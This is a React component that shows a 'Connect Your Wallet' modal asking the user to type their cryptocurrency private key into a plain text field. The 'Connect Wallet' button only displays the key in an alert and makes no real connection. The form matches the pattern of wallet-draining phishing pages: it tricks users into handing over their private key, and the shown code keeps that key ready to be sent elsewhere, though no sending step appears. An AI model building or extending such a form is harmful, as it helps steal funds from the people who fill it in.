import React, { useState } from "react";
import styles from "./PhraseModal.module.css";

function PhraseModal() {
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [privateKey, setPrivateKey] = useState("");

  const handleCloseModal = () => {
    setIsModalOpen(false);
  };

  const handleConnectClick = () => {
    alert(`Connecting wallet with private key: ${privateKey}`);
  };

  const handlePrivateKeyChange = (e) => {
    setPrivateKey(e.target.value);
  };

  if (!isModalOpen) {
    return null;
  }

  return (
    <div className={styles.overlay} onClick={handleCloseModal}>
      <div
        className={styles.modalContainer}
        onClick={(e) => e.stopPropagation()} // Prevents closing the modal when clicking inside
      >
        <button onClick={handleCloseModal} className={styles.closeButton}>
          &times;
        </button>
        <h2>Connect Your Wallet</h2>
        <p>Input Private Key phrase</p>
        <div className={styles.formGroup}>
          <input
            type="text"
            className={styles.privateKeyInput}
            placeholder="Enter Private Key*"
            value={privateKey}
            onChange={handlePrivateKeyChange}
          />
        </div>
        <p className={styles.infoText}>
          Typically contains a string of alphanumeric characters which are about
          50 or more in number.
        </p>
        <div className={styles.buttonGroup}>
          <button onClick={handleConnectClick} className={styles.connectButton}>
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );
}

export default PhraseModal;
